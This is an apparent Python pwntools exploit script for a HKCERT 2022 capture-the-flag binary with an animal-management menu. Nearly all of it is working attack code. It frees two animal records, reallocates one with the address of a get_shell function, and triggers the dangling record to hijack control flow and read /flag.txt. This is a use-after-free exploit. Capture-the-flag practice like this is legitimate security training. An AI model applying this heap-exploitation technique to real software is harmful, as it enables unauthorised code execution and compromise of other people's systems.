from pwn import *

context.os = 'linux'
context.arch = 'amd64'
# context.log_level = 'debug'

# p = gdb.debug('./chall', 'break *report_name+256')
# p = process('./chall')
p = remote('chal.hkcert22.pwnable.hk', '28235')
elf = ELF('./chall')

def add_animal(name_size, name_content):
    p.sendlineafter(b'Exit\n> ', b'1') # Add animal
    p.sendlineafter(b'Panda\n> ', b'1') # Type: Parrot
    p.sendlineafter(b'characters)\n> ', str(name_size)) # Name size
    p.sendlineafter(b'animal?\n> ', name_content) # Name content

def remove_animal(id):
    p.sendlineafter(b'Exit\n> ', b'2') # Remove animal
    p.sendlineafter(b'(0-9)\n> ', str(id))

def report_name(id):
    p.sendlineafter(b'Exit\n> ', b'3') # Report animal Name
    p.sendlineafter(b'(0-9)\n> ', str(id)) # Make dead animal speak

add_animal(24, 'LaoSparrow') # Animal 0
add_animal(63, 'IDK') # Animal 1

remove_animal(0)
remove_animal(1)

add_animal(24, p64(elf.symbols['get_shell'])) # Animal 2

report_name(0)

p.sendline('cat /flag.txt')
p.interactive()